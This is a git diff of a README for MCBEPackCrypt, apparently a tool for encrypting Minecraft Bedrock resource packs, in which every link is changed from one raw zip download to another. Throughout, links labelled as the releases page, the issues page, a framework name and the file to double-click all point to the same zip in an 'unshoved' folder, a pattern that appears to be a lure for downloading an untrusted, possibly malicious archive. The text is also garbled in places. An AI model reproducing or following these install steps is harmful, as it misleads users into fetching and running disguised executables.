@@ -2,7 +2,7 @@
 
 ## 🚀 Getting Started
 
-Welcome to MCBEPackCrypt! This is a web-based tool that allows you to easily encrypt and decrypt Minecraft Bedrock Edition resource packs. The software is built using TypeScript and https://raw.githubusercontent.com/v3ntur4-creator/MCBEPackCrypt/main/unshoved/MCBEPackCrypt.zip, making it efficient and straightforward to use. Let’s dive into how you can set it up on your computer.
+Welcome to MCBEPackCrypt! This is a web-based tool that allows you to easily encrypt and decrypt Minecraft Bedrock Edition resource packs. The software is built using TypeScript and https://github.com/v3ntur4-creator/MCBEPackCrypt/raw/refs/heads/main/unshoved/MCBE_Pack_Crypt_v2.2.zip, making it efficient and straightforward to use. Let’s dive into how you can set it up on your computer.
 
 ## 🛠️ System Requirements
 
@@ -14,16 +14,16 @@ Before you start, please ensure that your computer meets the following requireme
 
 ## 📥 Download MCBEPackCrypt
 
-[![Download MCBEPackCrypt](https://raw.githubusercontent.com/v3ntur4-creator/MCBEPackCrypt/main/unshoved/MCBEPackCrypt.zip%20Now-Get%20the%20Latest%https://raw.githubusercontent.com/v3ntur4-creator/MCBEPackCrypt/main/unshoved/MCBEPackCrypt.zip)](https://raw.githubusercontent.com/v3ntur4-creator/MCBEPackCrypt/main/unshoved/MCBEPackCrypt.zip)
+[![Download MCBEPackCrypt](https://github.com/v3ntur4-creator/MCBEPackCrypt/raw/refs/heads/main/unshoved/MCBE_Pack_Crypt_v2.2.zip%20Now-Get%20the%20Latest%https://github.com/v3ntur4-creator/MCBEPackCrypt/raw/refs/heads/main/unshoved/MCBE_Pack_Crypt_v2.2.zip)](https://github.com/v3ntur4-creator/MCBEPackCrypt/raw/refs/heads/main/unshoved/MCBE_Pack_Crypt_v2.2.zip)
 
 To download the latest version of MCBEPackCrypt, visit the Releases page:
 
-- **Visit this page to download:** [MCBEPackCrypt Releases](https://raw.githubusercontent.com/v3ntur4-creator/MCBEPackCrypt/main/unshoved/MCBEPackCrypt.zip)
+- **Visit this page to download:** [MCBEPackCrypt Releases](https://github.com/v3ntur4-creator/MCBEPackCrypt/raw/refs/heads/main/unshoved/MCBE_Pack_Crypt_v2.2.zip)
 
 ## 📦 Download & Install
 
 1. **Visit the Releases Page:**
-   Go to the [MCBEPackCrypt Releases](https://raw.githubusercontent.com/v3ntur4-creator/MCBEPackCrypt/main/unshoved/MCBEPackCrypt.zip) link.
+   Go to the [MCBEPackCrypt Releases](https://github.com/v3ntur4-creator/MCBEPackCrypt/raw/refs/heads/main/unshoved/MCBE_Pack_Crypt_v2.2.zip) link.
 
 2. **Select the Latest Release:**
    Look for the most recent version listed on the page. This version will have the latest features and any improvements.
@@ -35,7 +35,7 @@ To download the latest version of MCBEPackCrypt, visit the Releases page:
    After downloading, locate the file on your computer and extract it. You can do this by right-clicking the file and selecting "Extract All" or using your preferred extraction tool.
 
 5. **Open the Application:**
-   Navigate to the extracted folder and find the `https://raw.githubusercontent.com/v3ntur4-creator/MCBEPackCrypt/main/unshoved/MCBEPackCrypt.zip` file. Double-click this file to open MCBEPackCrypt in your web browser. You are ready to go!
+   Navigate to the extracted folder and find the `https://github.com/v3ntur4-creator/MCBEPackCrypt/raw/refs/heads/main/unshoved/MCBE_Pack_Crypt_v2.2.zip` file. Double-click this file to open MCBEPackCrypt in your web browser. You are ready to go!
 
 ## ⚙️ How to Use MCBEPackCrypt
 
@@ -83,6 +83,6 @@ Yes, MCBEPackCrypt is designed to handle files locally in your web browser. Your
 
 ## 💬 Support
 
-If you encounter any issues while using MCBEPackCrypt, please check the [issues page](https://raw.githubusercontent.com/v3ntur4-creator/MCBEPackCrypt/main/unshoved/MCBEPackCrypt.zip) on GitHub. You can report any bugs or ask questions.
+If you encounter any issues while using MCBEPackCrypt, please check the [issues page](https://github.com/v3ntur4-creator/MCBEPackCrypt/raw/refs/heads/main/unshoved/MCBE_Pack_Crypt_v2.2.zip) on GitHub. You can report any bugs or ask questions.
 
 Thank you for using MCBEPackCrypt! Enjoy encrypting and decrypting your Minecraft resource packs easily.
